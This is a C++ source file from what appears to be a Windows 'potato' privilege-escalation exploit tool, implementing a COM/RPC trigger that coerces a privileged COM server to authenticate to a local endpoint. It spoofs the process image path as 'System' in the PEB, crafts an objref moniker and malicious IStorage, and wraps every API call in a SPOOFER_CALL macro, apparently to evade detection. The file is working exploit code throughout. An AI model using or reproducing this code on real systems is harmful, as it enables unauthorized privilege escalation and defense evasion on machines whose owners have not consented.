#include "Header.h"

#include "PotatoTrigger.h"
#include "stdio.h"
#include "wincrypt.h"
#include "objbase.h"
#include "IUnknownObj.h"
#include "IStorageTrigger.h"

#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Rpcrt4.lib")

char gOxid[8];
char gOid[8];
char gIpid[16];

void InitComServer() {
	PROCESS_BASIC_INFORMATION pebInfo = { 0 };
	SOLE_AUTHENTICATION_SERVICE authInfo = { 0 };
	ULONG ReturnLength = 0;
	wchar_t oldImagePathName[MAX_PATH] = { 0 };
	wchar_t newImagePathName[] = L"System";
	WCHAR spnInfo[] = L"";

	SPOOFER_CALL(NtQueryInformationProcess)(SPOOFER_CALL(GetCurrentProcess)(), ProcessBasicInformation, &pebInfo, sizeof(pebInfo), &ReturnLength);

	if (pebInfo.PebBaseAddress == NULL)
	{
		return;
	}

	// save the old image path name and patch with the new one
	memset(oldImagePathName, 0, sizeof(wchar_t) * MAX_PATH);
	memcpy(oldImagePathName, pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Length);
	memcpy(pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, newImagePathName, sizeof(newImagePathName));
	
	authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
	authInfo.pPrincipalName = spnInfo;

	// init COM runtime
	SPOOFER_CALL(CoInitialize)(NULL);
	SPOOFER_CALL(CoInitializeSecurity)(NULL, 1, &authInfo, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);

	// Restore PEB ImagePathName
	memcpy(pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, oldImagePathName, pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Length);
}

// this is the implementation of the "local" potato trigger discovered by @tiraniddo --> https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html
void PotatoTrigger(PWCHAR clsidStr, PWCHAR comPort, HANDLE hEventWait) {
	IMoniker* monikerObj;
	IBindCtx* bindCtx;
	IUnknown* IUnknownObj1Ptr;
	RPC_STATUS rpcStatus;
	HRESULT result;
	PWCHAR objrefBuffer = (PWCHAR)SPOOFER_CALL(CoTaskMemAlloc)(DEFAULT_BUFLEN);
	char* objrefDecoded = (char*)SPOOFER_CALL(CoTaskMemAlloc)(DEFAULT_BUFLEN);
	DWORD objrefDecodedLen = DEFAULT_BUFLEN;

	// Init COM server
	InitComServer();

	// we create a random IUnknown object as a placeholder to pass to the moniker
	IUnknownObj IUnknownObj1 = IUnknownObj();
	IUnknownObj1.QueryInterface(IID_IUnknown, (void**)&IUnknownObj1Ptr);

	result = SPOOFER_CALL(CreateObjrefMoniker)(IUnknownObj1Ptr, &monikerObj);
	if (result != S_OK) {
		printf("[!] CreateObjrefMoniker failed with HRESULT %d\n", result);
		exit(-1);
	}
	SPOOFER_CALL(CreateBindCtx)(0, &bindCtx);
	monikerObj->GetDisplayName(bindCtx, NULL, (LPOLESTR*)&objrefBuffer);
	//printf("[*] Objref Moniker Display Name = %S\n", objrefBuffer);
	// the moniker is in the format objref:[base64encodedobject]: so we skip the first 7 chars and the last colon char
	base64Decode(objrefBuffer + 7, (int)(wcslen(objrefBuffer) - 7 - 1), objrefDecoded, &objrefDecodedLen);
	// we copy the needed data to communicate with our local com server (this process)
	memcpy(gOxid, objrefDecoded + 32, 8);
	memcpy(gOid, objrefDecoded + 40, 8);
	memcpy(gIpid, objrefDecoded + 48, 16);
	// we register the port of our local com server
	rpcStatus = SPOOFER_CALL(RpcServerUseProtseqEpW)((RPC_WSTR)L"ncacn_ip_tcp", RPC_C_PROTSEQ_MAX_REQS_DEFAULT, (RPC_WSTR)comPort, NULL);

	if (rpcStatus != S_OK) {
		printf("[!] RpcServerUseProtseqEp failed with rpc status code %d\n", rpcStatus);
		exit(-1);
	}

	SPOOFER_CALL(RpcServerRegisterAuthInfoW)(NULL, RPC_C_AUTHN_WINNT, NULL, NULL);

	result = UnmarshallIStorage(clsidStr);
	if (result == CO_E_BAD_PATH) 
	{
		printf("[!] CLSID %S not found. Error Bad path to object. Exiting...\n", clsidStr);
		exit(-1);
	}

	if (hEventWait)
	{
		SPOOFER_CALL(WaitForSingleObject)(hEventWait, 1000);
	}

	IUnknownObj1Ptr->Release();
	IUnknownObj1.Release();
	bindCtx->Release();
	monikerObj->Release();
	SPOOFER_CALL(CoTaskMemFree)(objrefBuffer);
	SPOOFER_CALL(CoTaskMemFree)(objrefDecoded);
	SPOOFER_CALL(CoUninitialize)();
}

HRESULT UnmarshallIStorage(PWCHAR clsidStr) {
	IStorage* stg = NULL;
	ILockBytes* lb = NULL;
	MULTI_QI qis[1];
	CLSID targetClsid;
	HRESULT result;
	//Create IStorage object
	SPOOFER_CALL(CreateILockBytesOnHGlobal)(NULL, TRUE, &lb);
	SPOOFER_CALL(StgCreateDocfileOnILockBytes)(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);
	//Initialze IStorageTrigger object
	IStorageTrigger* IStorageTriggerObj = new IStorageTrigger(stg);
	SPOOFER_CALL(CLSIDFromString)(clsidStr, &targetClsid);
	qis[0].pIID = &IID_IUnknown;
	qis[0].pItf = NULL;
	qis[0].hr = 0;
	//printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S\n", clsidStr);
	result = SPOOFER_CALL(CoGetInstanceFromIStorage)(NULL, &targetClsid, NULL, CLSCTX_LOCAL_SERVER, IStorageTriggerObj, 1, qis);
	return result;
}

void base64Decode(PWCHAR b64Text, int b64TextLen, char* buffer, DWORD* bufferLen) {
	if (!SPOOFER_CALL(CryptStringToBinaryW)(b64Text, b64TextLen, CRYPT_STRING_BASE64, (BYTE*)buffer, (DWORD*)bufferLen, NULL, NULL)) {
		printf("[!] CryptStringToBinaryW failed with error code %d\n", GetLastError());
		exit(-1);
	}
}

